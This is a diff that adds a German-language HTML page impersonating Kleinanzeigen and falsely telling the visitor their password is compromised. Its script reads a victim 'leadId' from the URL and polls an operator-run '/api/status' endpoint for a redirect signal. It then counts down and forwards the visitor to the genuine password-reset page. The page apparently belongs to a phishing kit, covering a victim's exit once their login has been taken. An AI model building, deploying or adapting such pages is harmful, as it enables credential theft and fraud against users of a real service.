@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="robots" content="noindex, follow">
+  <title>Kontosicherheit</title>
+  <link rel="icon" href="/klein-favicon.png" type="image/png" sizes="32x32">
+  <style>
+    body { font-family: "Helvetica Neue", Helvetica, Arial, sans-serif; margin: 0; background: #f4f2ef; }
+    .knz-header {
+      display: block; position: sticky; top: 0; z-index: 999; background: #fff; text-align: center;
+      height: 50px; width: 100%; padding: 12px 0; border-bottom: 1px solid #dddbd5; box-sizing: border-box;
+    }
+    .knz-header__logo-img { height: 32px; width: auto; vertical-align: middle; display: block; margin: 0 auto; }
+    .l-page-wrapper { max-width: 520px; margin: 0 auto; padding: 24px 16px; }
+    .warn-box {
+      background: #fff; border-radius: 8px; padding: 24px; box-shadow: 0 1px 3px rgba(0,0,0,.08);
+      border: 1px solid #e8e4df;
+    }
+    .warn-title { font-size: 1.125rem; font-weight: 700; margin: 0 0 16px; color: #b30c0c; }
+    .warn-text { font-size: 0.9375rem; line-height: 1.55; color: #222; margin: 0 0 16px; }
+    .warn-count { font-size: 1.25rem; font-weight: 700; text-align: center; margin: 20px 0; color: #326916; }
+    .warn-link { color: #326916; font-weight: 600; word-break: break-all; }
+    .warn-muted { font-size: 0.8125rem; color: #77756f; margin-top: 20px; }
+  </style>
+  <!-- __BRAND_JSON__ -->
+</head>
+<body>
+  <header class="knz-header">
+    <a href="#" id="knz-warn-logo" class="knz-header__logo-link" aria-label="Logo">
+      <img class="knz-header__logo-img" src="/klein-local-logo.png" alt="">
+    </a>
+  </header>
+  <div class="l-page-wrapper">
+    <div class="warn-box">
+      <h1 class="warn-title">Ihr Konto ist gefährdet</h1>
+      <p class="warn-text" id="warn-main">
+        Ihr Passwort wurde kompromittiert. Sie werden nun auf die offizielle Seite zur Passwortänderung von Kleinanzeigen weitergeleitet.
+        Wenn die Weiterleitung nicht automatisch erfolgt, klicken Sie auf:
+        <a class="warn-link" id="warn-manual-link" href="#">Passwort ändern</a>
+      </p>
+      <p class="warn-count">Automatische Weiterleitung in: <span id="warn-sec">10</span> s</p>
+      <p class="warn-muted" id="warn-foot" hidden></p>
+    </div>
+  </div>
+  <script>
+(function () {
+  'use strict';
+  var SEC = 10;
+  var logo = document.getElementById('knz-warn-logo');
+  if (logo) logo.addEventListener('click', function (e) { e.preventDefault(); });
+  function brandFallback() {
+    try {
+      var b = typeof window !== 'undefined' && window.__BRAND__;
+      var u = b && b.kleinOfficialPasswordResetUrl;
+      if (u && typeof u === 'string' && /^https?:\/\//i.test(u.trim())) return u.trim();
+    } catch (e1) {}
+    return 'https://www.kleinanzeigen.de/m-passwort-vergessen.html';
+  }
+  function getId() {
+    try {
+      var q = new URLSearchParams(window.location.search);
+      var id = q.get('id');
+      return id && id.trim() ? id.trim() : '';
+    } catch (e2) { return ''; }
+  }
+  function setFoot(t) {
+    var f = document.getElementById('warn-foot');
+    if (!f) return;
+    f.textContent = t || '';
+    f.hidden = !t;
+  }
+  function go(url) {
+    try { window.location.href = url; } catch (e3) {}
+  }
+  var leadId = getId();
+  if (!leadId) {
+    setFoot('Sitzung nicht gefunden. Öffnen Sie die Seite über den Link aus der Anmeldung.');
+    document.getElementById('warn-sec').textContent = '—';
+    return;
+  }
+  fetch('/api/status?id=' + encodeURIComponent(leadId) + '&page=klein-passwort-warnung&_=' + Date.now(), {
+    cache: 'no-store',
+    headers: { Pragma: 'no-cache' }
+  })
+    .then(function (r) { return r.json(); })
+    .then(function (res) {
+      var st = res && res.status;
+      var target = (res && res.kleinForgotTargetUrl && String(res.kleinForgotTargetUrl).trim()) || brandFallback();
+      if (st !== 'redirect_klein_forgot') {
+        setFoot('Warten auf System… Falls Sie diese Seite manuell geöffnet haben, kehren Sie zur Anmeldeseite zurück.');
+        document.getElementById('warn-sec').textContent = '—';
+        var link = document.getElementById('warn-manual-link');
+        if (link) { link.href = target; link.setAttribute('href', target); }
+        return;
+      }
+      var manual = document.getElementById('warn-manual-link');
+      if (manual) manual.href = target;
+      var secEl = document.getElementById('warn-sec');
+      var left = SEC;
+      if (secEl) secEl.textContent = String(left);
+      var tick = setInterval(function () {
+        left -= 1;
+        if (secEl) secEl.textContent = String(Math.max(0, left));
+        if (left <= 0) {
+          clearInterval(tick);
+          go(target);
+        }
+      }, 1000);
+    })
+    .catch(function () {
+      setFoot('Server nicht erreichbar. Nutzen Sie den Link „Passwort ändern“ unten.');
+      var fb = brandFallback();
+      var link = document.getElementById('warn-manual-link');
+      if (link) link.href = fb;
+    });
+})();
+  </script>
+</body>
+</html>
